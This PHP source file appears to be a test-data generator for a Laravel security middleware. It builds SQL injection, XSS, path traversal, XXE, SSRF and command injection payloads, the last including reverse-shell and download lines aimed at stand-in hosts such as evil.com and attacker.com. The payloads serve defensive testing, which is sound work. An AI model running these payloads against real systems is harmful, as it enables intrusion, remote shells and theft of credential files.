<?php

declare(strict_types=1);

namespace Mounir\RuntimeGuard\DevTools;

use Illuminate\Http\Request;
use Faker\Factory as Faker;

/**
 * Test Data Generator.
 *
 * Generates test data for security testing:
 * - Malicious payloads
 * - Benign test data
 * - Fuzz testing data
 * - Request simulation
 */
class TestDataGenerator
{
    private \Faker\Generator $faker;
    private array $config;

    public function __construct(array $config = [])
    {
        $this->faker = Faker::create();
        $this->config = $config;
    }

    /**
     * Generate malicious SQL injection payloads.
     */
    public function sqlInjectionPayloads(int $count = 20): array
    {
        $templates = [
            "' OR '1'='1",
            "' OR ''='",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' UNION SELECT {columns}--",
            "' UNION SELECT NULL,{columns}--",
            "' UNION ALL SELECT {columns}--",
            "'; DROP TABLE {table};--",
            "'; INSERT INTO {table} VALUES({values});--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT COUNT(*) FROM {table})>0--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5';--",
            "' AND 1=CONVERT(int, @@version)--",
            "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
        ];

        $payloads = [];
        for ($i = 0; $i < $count; $i++) {
            $template = $templates[array_rand($templates)];
            $payload = strtr($template, [
                '{columns}' => $this->generateColumns(),
                '{table}' => $this->faker->word,
                '{values}' => $this->generateValues(),
            ]);
            $payloads[] = $this->mutate($payload);
        }

        return $payloads;
    }

    /**
     * Generate malicious XSS payloads.
     */
    public function xssPayloads(int $count = 20): array
    {
        $templates = [
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<div onclick=alert(1)>click</div>',
            '<a href="javascript:alert(1)">click</a>',
            '<a href="data:text/html,<script>alert(1)</script>">click</a>',
            '<iframe src="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<form action="javascript:alert(1)"><input type=submit>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            '\'-alert(1)-\'',
            '{{constructor.constructor("alert(1)")()}}',
            '<style>@import "javascript:alert(1)";</style>',
        ];

        $payloads = [];
        for ($i = 0; $i < $count; $i++) {
            $template = $templates[array_rand($templates)];
            $payloads[] = $this->mutate($template);
        }

        return $payloads;
    }

    /**
     * Generate path traversal payloads.
     */
    public function pathTraversalPayloads(int $count = 20): array
    {
        $files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/nginx/nginx.conf',
            '/var/log/apache2/access.log',
            '/proc/self/environ',
            '/windows/system32/config/sam',
            '/boot.ini',
            'web.config',
            '.htaccess',
            '.env',
            'wp-config.php',
        ];

        $traversals = ['../', '..../', '..\\', '....\\'];
        $encodings = [
            fn($s) => $s,
            fn($s) => str_replace('../', '..%2f', $s),
            fn($s) => str_replace('../', '%2e%2e%2f', $s),
            fn($s) => str_replace('../', '%252e%252e%252f', $s),
            fn($s) => str_replace('../', '..%c0%af', $s),
        ];

        $payloads = [];
        for ($i = 0; $i < $count; $i++) {
            $file = $files[array_rand($files)];
            $traversal = $traversals[array_rand($traversals)];
            $depth = rand(3, 10);
            $path = str_repeat($traversal, $depth) . ltrim($file, '/');

            $encoding = $encodings[array_rand($encodings)];
            $payloads[] = $encoding($path);
        }

        return $payloads;
    }

    /**
     * Generate command injection payloads.
     */
    public function commandInjectionPayloads(int $count = 20): array
    {
        $templates = [
            '; {command}',
            '| {command}',
            '|| {command}',
            '&& {command}',
            '& {command}',
            '`{command}`',
            '$({command})',
            "\n{command}",
            "\r\n{command}",
            "test; {command}",
            "test | {command}",
            "test || {command}",
            "test && {command}",
        ];

        $commands = [
            'id', 'whoami', 'cat /etc/passwd', 'ls -la', 'pwd',
            'uname -a', 'ps aux', 'netstat -an', 'ifconfig',
            'wget http://evil.com/shell.sh', 'curl http://evil.com/shell.sh',
            'nc -e /bin/sh attacker.com 4444', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        ];

        $payloads = [];
        for ($i = 0; $i < $count; $i++) {
            $template = $templates[array_rand($templates)];
            $command = $commands[array_rand($commands)];
            $payloads[] = strtr($template, ['{command}' => $command]);
        }

        return $payloads;
    }

    /**
     * Generate XXE payloads.
     */
    public function xxePayloads(int $count = 10): array
    {
        $payloads = [];

        $templates = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        ];

        for ($i = 0; $i < $count; $i++) {
            $payloads[] = $templates[$i % count($templates)];
        }

        return $payloads;
    }

    /**
     * Generate SSRF payloads.
     */
    public function ssrfPayloads(int $count = 15): array
    {
        $internalUrls = [
            'http://localhost',
            'http://127.0.0.1',
            'http://[::1]',
            'http://0.0.0.0',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            'http://169.254.169.254', // AWS metadata
            'http://metadata.google.internal', // GCP
            'http://169.254.169.254/latest/meta-data/', // AWS
            'http://169.254.169.254/computeMetadata/v1/', // GCP
            'file:///etc/passwd',
            'dict://localhost:11211/',
            'gopher://localhost:6379/_INFO',
        ];

        $payloads = [];
        for ($i = 0; $i < $count; $i++) {
            $payloads[] = $internalUrls[$i % count($internalUrls)];
        }

        return $payloads;
    }

    /**
     * Generate benign test data.
     */
    public function benignData(int $count = 50): array
    {
        $data = [];

        for ($i = 0; $i < $count; $i++) {
            $data[] = [
                'name' => $this->faker->name,
                'email' => $this->faker->email,
                'address' => $this->faker->address,
                'phone' => $this->faker->phoneNumber,
                'company' => $this->faker->company,
                'text' => $this->faker->paragraph,
                'number' => $this->faker->randomNumber(),
                'date' => $this->faker->date(),
                'url' => $this->faker->url,
            ];
        }

        return $data;
    }

    /**
     * Generate fuzz test data.
     */
    public function fuzzData(int $count = 100): array
    {
        $data = [];

        $generators = [
            fn() => str_repeat($this->faker->randomLetter, rand(1, 10000)),
            fn() => $this->faker->regexify('[a-zA-Z0-9]{1,1000}'),
            fn() => str_repeat('%', rand(1, 100)),
            fn() => str_repeat('\\', rand(1, 100)),
            fn() => str_repeat("'", rand(1, 100)),
            fn() => str_repeat('"', rand(1, 100)),
            fn() => str_repeat('<', rand(1, 100)) . str_repeat('>', rand(1, 100)),
            fn() => implode('', array_map(fn() => chr(rand(0, 255)), range(1, rand(10, 100)))),
            fn() => implode('', array_map(fn() => chr(rand(0, 31)), range(1, rand(10, 50)))),
            fn() => "\x00" . $this->faker->word . "\x00",
            fn() => $this->faker->emoji . $this->faker->emoji . $this->faker->emoji,
            fn() => '{{' . $this->faker->word . '}}',
            fn() => '${' . $this->faker->word . '}',
            fn() => '<!--' . $this->faker->word . '-->',
            fn() => str_repeat($this->faker->randomFloat(2, 0, 999999), rand(1, 100)),
        ];

        for ($i = 0; $i < $count; $i++) {
            $generator = $generators[array_rand($generators)];
            $data[] = $generator();
        }

        return $data;
    }

    /**
     * Generate mock HTTP requests.
     */
    public function generateRequests(int $count = 20, array $options = []): array
    {
        $requests = [];
        $methods = $options['methods'] ?? ['GET', 'POST', 'PUT', 'DELETE'];
        $paths = $options['paths'] ?? ['/api/users', '/api/products', '/api/orders', '/admin', '/login'];

        for ($i = 0; $i < $count; $i++) {
            $method = $methods[array_rand($methods)];
            $path = $paths[array_rand($paths)];

            $request = [
                'method' => $method,
                'path' => $path,
                'headers' => $this->generateHeaders(),
                'query' => $method === 'GET' ? $this->generateQueryParams() : [],
                'body' => in_array($method, ['POST', 'PUT']) ? $this->generateBody() : null,
                'ip' => $this->faker->ipv4,
            ];

            $requests[] = $request;
        }

        return $requests;
    }

    /**
     * Generate malicious request dataset.
     */
    public function generateMaliciousRequests(int $count = 50): array
    {
        $requests = [];
        $payloadTypes = [
            'sql' => fn() => $this->sqlInjectionPayloads(1)[0],
            'xss' => fn() => $this->xssPayloads(1)[0],
            'path' => fn() => $this->pathTraversalPayloads(1)[0],
            'cmd' => fn() => $this->commandInjectionPayloads(1)[0],
        ];

        for ($i = 0; $i < $count; $i++) {
            $type = array_rand($payloadTypes);
            $payload = $payloadTypes[$type]();

            $request = [
                'method' => 'POST',
                'path' => '/api/test',
                'headers' => $this->generateHeaders(),
                'body' => ['data' => $payload],
                'ip' => $this->faker->ipv4,
                'attack_type' => $type,
            ];

            $requests[] = $request;
        }

        return $requests;
    }

    /**
     * Generate mixed dataset (malicious + benign).
     */
    public function generateMixedDataset(int $total = 100, float $maliciousRatio = 0.3): array
    {
        $maliciousCount = (int)($total * $maliciousRatio);
        $benignCount = $total - $maliciousCount;

        $malicious = $this->generateMaliciousRequests($maliciousCount);
        $benign = array_map(function ($data) {
            return [
                'method' => 'POST',
                'path' => '/api/test',
                'headers' => $this->generateHeaders(),
                'body' => $data,
                'ip' => $this->faker->ipv4,
                'attack_type' => null,
            ];
        }, $this->benignData($benignCount));

        $mixed = array_merge($malicious, $benign);
        shuffle($mixed);

        return $mixed;
    }

    /**
     * Generate rate limit test data.
     */
    public function generateRateLimitTest(int $requestCount = 200, string $ip = null): array
    {
        $ip = $ip ?? $this->faker->ipv4;
        $requests = [];
        $startTime = time();

        for ($i = 0; $i < $requestCount; $i++) {
            $requests[] = [
                'method' => 'GET',
                'path' => '/api/resource',
                'ip' => $ip,
                'timestamp' => $startTime + (int)($i * 0.1), // ~10 requests per second
            ];
        }

        return $requests;
    }

    /**
     * Generate enumeration test data.
     */
    public function generateEnumerationTest(int $count = 50): array
    {
        $requests = [];

        for ($i = 1; $i <= $count; $i++) {
            $requests[] = [
                'method' => 'GET',
                'path' => "/api/users/{$i}",
                'ip' => $this->faker->ipv4,
            ];
        }

        return $requests;
    }

    /**
     * Generate headers.
     */
    private function generateHeaders(): array
    {
        return [
            'User-Agent' => $this->faker->userAgent,
            'Accept' => 'application/json',
            'Accept-Language' => 'en-US,en;q=0.9',
            'Accept-Encoding' => 'gzip, deflate, br',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
    }

    /**
     * Generate query params.
     */
    private function generateQueryParams(): array
    {
        return [
            'page' => rand(1, 10),
            'limit' => rand(10, 100),
            'search' => $this->faker->word,
        ];
    }

    /**
     * Generate body.
     */
    private function generateBody(): array
    {
        return [
            'name' => $this->faker->name,
            'email' => $this->faker->email,
            'message' => $this->faker->sentence,
        ];
    }

    /**
     * Generate columns for SQL.
     */
    private function generateColumns(): string
    {
        $count = rand(1, 5);
        $columns = [];
        for ($i = 0; $i < $count; $i++) {
            $columns[] = rand(0, 1) ? 'NULL' : "'" . $this->faker->word . "'";
        }
        return implode(',', $columns);
    }

    /**
     * Generate values for SQL.
     */
    private function generateValues(): string
    {
        $count = rand(2, 4);
        $values = [];
        for ($i = 0; $i < $count; $i++) {
            $values[] = "'" . $this->faker->word . "'";
        }
        return implode(',', $values);
    }

    /**
     * Mutate payload for variation.
     */
    private function mutate(string $payload): string
    {
        $mutations = [
            fn($p) => $p, // No mutation
            fn($p) => strtoupper($p),
            fn($p) => strtolower($p),
            fn($p) => str_replace(' ', '/**/', $p),
            fn($p) => str_replace(' ', '%20', $p),
            fn($p) => str_replace(' ', '+', $p),
        ];

        $mutation = $mutations[array_rand($mutations)];
        return $mutation($payload);
    }
}
